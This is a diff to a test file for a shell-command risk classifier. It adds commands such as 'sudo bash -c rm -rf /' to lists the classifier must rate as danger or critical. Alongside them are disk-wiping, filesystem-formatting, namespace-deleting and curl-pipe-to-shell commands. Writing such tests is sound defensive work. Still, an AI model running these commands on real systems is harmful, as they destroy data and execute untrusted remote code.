@@ -13,6 +13,8 @@ test("risk classifier separates native work from destructive effects", () => {
 		"docker system prune -af",
 		"kubectl delete namespace prod",
 		"chmod -R 777 ./data",
+		"env MODE=prod sudo systemctl restart nginx",
+		"bash -c 'rm -rf ./build'",
 		"/apply session:prod --execute -- touch ready",
 	]) {
 		assert.equal(assessRisk(command).level, "danger", command);
@@ -22,6 +24,7 @@ test("risk classifier separates native work from destructive effects", () => {
 		"dd if=/dev/zero of=/dev/sda",
 		"mkfs.ext4 /dev/vdb",
 		"curl https://example.invalid/install.sh | sudo sh",
+		"sudo bash -c 'rm -rf /'",
 	]) {
 		assert.equal(assessRisk(command).level, "critical", command);
 	}
